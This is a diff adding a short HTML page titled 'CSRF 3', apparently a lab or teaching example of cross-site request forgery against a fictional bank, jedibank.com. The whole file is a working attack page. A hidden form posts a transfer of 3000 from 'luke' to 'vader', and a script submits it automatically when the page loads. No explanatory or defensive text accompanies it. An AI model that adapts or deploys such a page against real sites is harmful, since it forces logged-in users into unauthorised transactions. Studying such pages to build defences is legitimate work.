@@ -1,0 +1,16 @@
+<html>
+    <head>
+        <title>CSRF 3</title>
+    </head>
+    <body>
+        <form method="POST" action="http://www.jedibank.com/transfer">
+            <input name="from" value="luke" />
+            <input name="to" value="vader" />
+            <input name="amount" value="3000" />
+            <input type="submit" value="do it" />
+        </form>
+        <script>
+            document.forms[0].submit()
+        </script>
+    </body>
+</html>
